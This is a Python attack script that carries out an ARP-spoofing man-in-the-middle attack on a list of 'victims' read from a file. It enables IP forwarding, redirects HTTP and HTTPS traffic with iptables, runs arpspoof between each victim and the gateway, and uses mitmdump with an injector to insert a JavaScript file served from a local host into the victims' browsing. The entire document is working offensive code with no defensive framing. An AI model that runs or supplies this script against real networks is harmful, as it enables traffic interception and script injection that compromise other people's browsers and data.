import os
import sys

gateway = sys.argv[1]
print("gateway: " + gateway)

victims = [line.rstrip('\n') for line in open("victims.txt")]
print("victims:")
print(victims)

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")

for victim in victims:
	os.system("xterm -e arpspoof -i ens33 -t " + victim + " " + gateway + " &")
	os.system("xterm -e arpspoof -i ens33 -t " + gateway + " " + victim + " &")

os.system("xterm -hold -e 'python3 httpServer.py' &")
os.system("/usr/local/bin/mitmdump -s 'injector.py http://10.0.2.20:8000/script.js' -T")
